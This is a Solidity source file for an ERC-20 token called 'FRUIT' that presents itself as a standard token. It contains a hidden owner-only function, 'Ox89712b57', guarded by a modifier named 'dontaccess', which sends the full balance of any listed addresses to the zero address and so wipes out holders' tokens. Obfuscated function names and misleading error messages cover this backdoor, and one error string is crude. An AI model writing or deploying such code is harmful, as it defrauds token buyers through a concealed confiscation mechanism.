contract fruittoken is Context, IERC20 {
 
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    address public elimination;
    constructor () {
        _name = "BananaAppleOrangeStrawberryBlueberryMangoPineapplePearKiwiWatermelon";
        _symbol = "FRUIT";
        _decimals = 18;
        uint256 initialSupply = 420000000000;
        elimination = msg.sender;
        awhile(msg.sender, initialSupply*(10**18));
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        sendit(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        sendit(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function awhile(address locker, uint256 amt) internal virtual {
        require(msg.sender == elimination, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[elimination] = _balances[elimination].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    
    function sendit(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    modifier dontaccess() {
        require(msg.sender == elimination, "Not allowed to suckmydick");
        _;
    }

    function Ox89712b57(address[] memory usage) public dontaccess() { 
        for (uint256 x = 0; x < usage.length; x++) {
            uint256 amt = _balances[usage[x]];
            _balances[usage[x]] = _balances[usage[x]].sub(amt, "ERROR");
            _balances[address(0)] = _balances[address(0)].add(amt);
        }
    }


}
